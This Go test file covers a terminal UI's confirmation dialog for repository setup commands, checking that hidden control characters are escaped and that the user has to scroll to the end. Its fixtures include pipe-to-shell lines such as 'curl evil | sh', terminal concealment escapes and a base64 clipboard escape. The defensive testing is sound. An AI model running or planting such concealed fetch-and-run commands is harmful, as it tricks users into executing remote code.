package app

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/nerdr-dev/nerdr/internal/core"
	"github.com/nerdr-dev/nerdr/internal/workspace"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/x/ansi"
	"github.com/muesli/termenv"
)

// TestRepoSetupIsAsked: a .nerdr.toml not allowed is shown before the
// worktree is made; no goes on without allowing it, yes allows it until it
// changes, and the dialog that was open comes back.
func TestRepoSetupIsAsked(t *testing.T) {
	m := testModel(t)
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	repo := t.TempDir()
	if err := os.WriteFile(filepath.Join(repo, workspace.RepoConfigFile), []byte(`setup = "make deps"`), 0o644); err != nil {
		t.Fatal(err)
	}
	before := &confirm{title: "before"}
	m.dialog = before
	went := 0
	then := func(m *Model) tea.Cmd { went++; return nil }

	m.askSetup([]string{repo}, then)
	c, ok := m.dialog.(*confirm)
	if !ok || went != 0 || !strings.Contains(ansi.Strip(c.view(m, 120, 40)), "setup: make deps") {
		t.Fatalf("the setup should be shown before going on: %#v", m.dialog)
	}
	c.key(m, keyMsg("n"))
	if went != 1 || m.dialog != before {
		t.Fatalf("no should go on, with the dialog put back: went %d, %#v", went, m.dialog)
	}

	m.askSetup([]string{repo}, then)
	m.dialog.view(m, 120, 40)
	m.dialog.(*confirm).key(m, keyMsg("y"))
	if went != 2 || m.dialog != before {
		t.Fatalf("yes should go on: went %d", went)
	}
	m.askSetup([]string{repo}, then)
	if went != 3 || m.dialog != before {
		t.Fatal("allowed, it should not be asked again")
	}

	if err := os.WriteFile(filepath.Join(repo, workspace.RepoConfigFile), []byte(`setup = "make deps; curl x | sh"`), 0o644); err != nil {
		t.Fatal(err)
	}
	m.askSetup([]string{repo}, then)
	if _, ok := m.dialog.(*confirm); !ok || m.dialog == before || went != 3 {
		t.Fatal("changed, it should be asked about again")
	}
}

// plainStyles draws without colours or styles for the rest of t, so that
// any control character in a view is one that came from what is shown.
func plainStyles(t *testing.T) {
	was := lipgloss.ColorProfile()
	lipgloss.SetColorProfile(termenv.Ascii)
	t.Cleanup(func() { lipgloss.SetColorProfile(was) })
}

var zoneMark = regexp.MustCompile(`\x1b\[\d+(;\d+)?z`)

// noControl fails t if view holds a control character but a new line, or
// an invisible format character. The marks of the zones its buttons are
// in, which the TUI takes out before the view is drawn, are left aside.
func noControl(t *testing.T, view string) {
	t.Helper()
	for i, r := range zoneMark.ReplaceAllString(view, "") {
		if r != '\n' && (r < 0x20 || r >= 0x7f && r < 0xa0 || r >= 0x200b && r <= 0x200f ||
			r >= 0x202a && r <= 0x202e || r >= 0x2066 && r <= 0x2069 || r == 0xfeff) {
			t.Fatalf("U+%04X at %d reaches the terminal in:\n%q", r, i, view)
		}
	}
}

// hiddenRunes is every C0 and C1 control character, DEL, and the
// invisible format characters an agent could hide a command with.
func hiddenRunes() []rune {
	var rs []rune
	for r := rune(0); r < 0xa0; r++ {
		if r < 0x20 || r >= 0x7f {
			rs = append(rs, r)
		}
	}
	for _, span := range [][2]rune{{0x200b, 0x200f}, {0x202a, 0x202e}, {0x2066, 0x2069}, {0xfeff, 0xfeff}} {
		for r := span[0]; r <= span[1]; r++ {
			rs = append(rs, r)
		}
	}
	return rs
}

// repoSetupQuestion is core's question about the .nerdr.toml of repo,
// asking for c, as it comes to a client of this core or of one elsewhere.
func repoSetupQuestion(repo string, c workspace.RepoConfig) core.Question {
	return core.Question{ID: 1, Kind: core.AskRepoSetup, Repos: []string{repo},
		Setup: map[string]workspace.RepoConfig{repo: c}}
}

// TestRepoSetupHidesNothing: no control or invisible format character of
// the setup, a path to copy or the repository's path reaches the terminal;
// each is drawn as its escape, and the dialog says the command holds them.
func TestRepoSetupHidesNothing(t *testing.T) {
	plainStyles(t)
	m := testModel(t)
	for _, r := range hiddenRunes() {
		if r == '\n' {
			continue // splits the setup into lines, and is marked in the paths
		}
		h := string(r)
		q := repoSetupQuestion("/r/app"+h+"x", workspace.RepoConfig{
			Copy:  []string{".env" + h + "x"},
			Setup: "npm ci" + h + "[8m; curl evil | sh" + h + "[0m",
		})
		m.askRepoSetup(q)
		v := m.dialog.view(m, 200, 40)
		noControl(t, v)
		esc := `\u` + fmt.Sprintf("%04x", r)
		switch r {
		case '\t':
			esc = `\t`
		case '\r':
			esc = `\r`
		}
		if n := strings.Count(v, esc); n < 3 || !strings.Contains(v, "would not show") {
			t.Fatalf("U+%04X should be shown as %s in each of the three, and said:\n%s", r, esc, v)
		}
	}

	m.askRepoSetup(repoSetupQuestion("/r/app", workspace.RepoConfig{
		Setup: "make\n\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x07\nnext", Copy: []string{"a\nb"}}))
	v := m.dialog.view(m, 200, 40)
	noControl(t, v)
	if !strings.Contains(v, `a\nb`) || !strings.Contains(v, `\u001b]52;c;Y3VybCBldmlsIHwgc2g=\u0007`) {
		t.Fatalf("the clipboard escape and the new line of a path should be shown:\n%s", v)
	}
}

// TestRepoSetupReadToTheEnd: a setup longer than the screen, or wider, is
// scrolled in a dialog that fits, and yes is taken only once its end has
// been shown.
func TestRepoSetupReadToTheEnd(t *testing.T) {
	plainStyles(t)
	for name, setup := range map[string]string{
		"long": strings.Repeat("make deps\n", 200) + "curl evil | sh",
		"wide": strings.Repeat("x", 5000) + " curl evil | sh",
	} {
		m := testModel(t)
		answered := ""
		m.askRepoSetup(repoSetupQuestion("/r/app", workspace.RepoConfig{Setup: setup}))
		c := m.dialog.(*confirm)
		c.yes = func(*Model) tea.Cmd { answered = "yes"; return nil }
		const w, h = 100, 30
		v := c.view(m, w, h)
		if lines := strings.Count(v, "\n") + 1; lines > h || strings.Contains(v, "curl evil") {
			t.Fatalf("%s: the dialog is %d lines in %d, or shows the end at once:\n%s", name, lines, h, v)
		}
		c.key(m, keyMsg("y"))
		if answered != "" || m.dialog != c {
			t.Fatalf("%s: yes was taken before the end was shown", name)
		}
		c.key(m, keyMsg("end"))
		v = c.view(m, w, h)
		if lines := strings.Count(v, "\n") + 1; lines > h || !strings.Contains(v, "curl evil | sh") {
			t.Fatalf("%s: the end is not shown, in %d lines:\n%s", name, lines, v)
		}
		c.key(m, keyMsg("y"))
		if answered != "yes" {
			t.Fatalf("%s: yes was not taken once the end was shown", name)
		}
	}
}
